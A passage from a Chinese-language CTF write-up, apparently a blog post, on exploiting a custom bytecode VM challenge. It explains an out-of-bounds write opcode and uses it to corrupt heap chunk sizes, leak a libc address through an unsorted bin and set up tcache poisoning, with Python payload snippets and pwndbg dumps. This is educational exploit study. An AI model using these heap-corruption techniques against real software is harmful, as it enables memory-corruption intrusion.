泄露地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      pop_(&lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);                               &lt;span class=&#34;comment&#34;&gt;// pop （int）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code != &lt;span class=&#34;number&#34;&gt;0xCA&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x6A&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_BYTE *)sRSP -= BYTE1(s);           &lt;span class=&#34;comment&#34;&gt;// [rsp] - [code]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(_BYTE *)sRSP = BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基本的运算都是字节进行操作，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x12 乘法运算&lt;/li&gt;
&lt;li&gt;0x13 重置 code,x,y，只有一次机会，利用的是原来的空间&lt;/li&gt;
&lt;li&gt;0x33 异或运算&lt;/li&gt;
&lt;li&gt;0x36 push 一字节的数据，数据来源于输入，我们输入 48 字节的数据，但是只用一字节，&lt;/li&gt;
&lt;li&gt;0x41 除法运算&lt;/li&gt;
&lt;li&gt;0x45 push 4 字节的数据&lt;/li&gt;
&lt;li&gt;0x49 设置 x,y, 跳转至目标位置 code，第 2，3 字节用于 x，4，5 字节用于 y。&lt;/li&gt;
&lt;li&gt;0x52 加法运算&lt;/li&gt;
&lt;li&gt;0x54 输出一字节栈顶的数据&lt;/li&gt;
&lt;li&gt;0x6a 减法运算&lt;/li&gt;
&lt;li&gt;0x98 pop 4 字节的数据&lt;/li&gt;
&lt;li&gt;0xcc pop 一字节的数据&lt;/li&gt;
&lt;li&gt;0xcd 读入 content 并且输出，虽然检查换行，但是满输入可以泄露地址。malloc 的参数只有一字节，所以 chunk 的大小为 0x20-0xf0。free 后没有情空指针。但是未发现 uaf&lt;/li&gt;
&lt;li&gt;0xd1 程序结束&lt;/li&gt;
&lt;li&gt;0xda rsp+offset 的位置写一字节的数据。这里存在数组越界，因为只会检查 offset 是否超过 X*Y 的范围，但是没有考虑到如果加上 rsp   的条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为他这个栈顶是有点问题的，栈空间已经被初始化为空的，大部分操作都会对 rsp+1，所以理论上栈顶的数据都是空的，一次 pop 也是空的。pop 要满足里面至少有一个数据，rsp-rbp&amp;gt;=1, 但是 push 的操作不会检查是否溢出和越界。pop 只会更改 rsp 指向，但不会改变原始数据。&lt;/p&gt;
&lt;p&gt;这个题最大问题就在与 0xda，正常来说，我们应该只能改变他所定义的那个类似于栈的空间的数据，那么应该是 rbp+offset，但是这里写的是 rsp，就导致了，如果我们的 XN*YN 比较大，offset 可以轻松绕过检查，但是我们将他的 stack 填充很多垃圾，rsp 距离下一个堆块比较近，就导致了 rsp+offset 越界了，起码可以修改到下一个 chunk 的 size。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(push4(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(jmp(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;思路就是我们通过 push (imm32) 来将 rsp 变得比较大，下面的 chunk 最开始是未分配，还是 topchunk，而程序会连续的 malloc，free 用于储存 content 的 chunk。我已为了构造一个较大的空间，我们连续的申请出 0x10,0x20,0x30,0x40…0xe0 的空间用看来布置 fakechunk.&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x331&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79580&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e795f0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79610&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;~~~~~&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79ac0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xd1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79b90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xe1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Top chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79c70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x20391&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过溢出，我们修改第一个 chunk 的 size 为 largebin 的范围.&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code.append(write(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xd1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;结果如下，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/28gx 0x55a9a9e79580&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e79580:	0x0000000000000000	0x0000000000000071&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e79590:	0xffffffffffffffff	0xffffffffffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795a0:	0xffffffffffffffff	0xffffffffffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795b0:	0xffffffffffffffff	0xffffffffffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795c0:	0xffffffffffffffff	0xffffffffffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795d0:	0xffffffffffffffff	0x0000000000000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795e0:	0x0000000000000000	0x00000000000000ee&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e795f0:	0x0000000000000000	0x00000000000004d1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x55a9a9e79600:	0x0000000000000000	0x000055a9a9e79010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x331&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79580&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e795f0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x4d1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79ac0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xd1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free chunk (tcache) | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x55a9a9e79b90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0xe1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样释放的时候，就不会进入 tcache。而是进入 unsortedbins，对于 content，会检查换行符，但是如果我们申请的是 8 字节，虽然同样会返回 0x20 的空间，但是，chunk 的 bk 可以被 % s 通泄露出来.(因为原本 0x20 的 chunk 被我们修改为 laegechunk 进入 unsortedbins)，tcache 没有符合要求的 chunk, 从 unsortedbins 里切割出来，bk 可以泄露 libc 的地址。&lt;/p&gt;
&lt;p&gt;下面的操作原理跟上面的一样，因为我们连续申请的一系列 chunk，存在 tcache 里面，所以，再次利用刚刚从 unsortedbins 切割出来的 chunk，(堆头和我们最开始 malloc (0x10) 一样，刚刚我们申请出来 0x20 的空间，接着马上被释放进入了 tcache，此时，tcache 的 bins 种都有一个 chunk, 我们希望通过修改其 fd 来获取目标地址。所以，我们还是把 0x20 的 chunk 拿出来，总比不过，我们向让她出来就不要再回去 0x20 的 tcachebin，而是其他位置，所以我们申请之前，再次通过越界修改他的 chunsize，我这里修改为 0x41, 这样再次申请释放后，其进入对应的 bins,fd 不为空。我这里并没有把 chunk 放入 unsortedbins 后直接申请 8 字节的空间，而是 malloc (0xf0)，下一次在 malloc (0x8)，结果是一样的。&lt;/p&gt;
